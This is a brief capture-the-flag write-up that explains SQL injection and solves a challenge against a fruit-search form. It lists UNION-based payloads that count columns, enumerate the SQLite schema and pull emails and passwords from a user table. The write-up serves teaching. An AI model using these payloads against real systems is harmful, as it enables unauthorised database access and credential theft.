# SQL-Injection

> Emil Lindblad

## What is a SQL-Injection?

SQL-Injection (SQLi) is a vulnerability that allows a user to perform queries to a database in ways not intended by the devloper. SQLi can be used to modify
or access data that the end user is not supposed to have access to, such as credentials for other users.

## Solving the challenge

This challenge drops you into a very basic webpage, containing a simple form with a single input. Based on the data returned, the database contains data about
fruits. The search returns data divided into 3 columns:

|Name|Price|Quantity|
|----|-----|--------|

This challenge was solved completly manually, ie not using any scripts or tools that can automate SQLi

```sql
Apple' UNION SELECT 1,2,3 ;--

Apple' UNION SELECT 1,2, name FROM sqlite_schema ;--

Apple' UNION SELECT 1,2, sql FROM sqlite_schema ;--

Apple' UNION SELECT email,password, name FROM user ;--

```
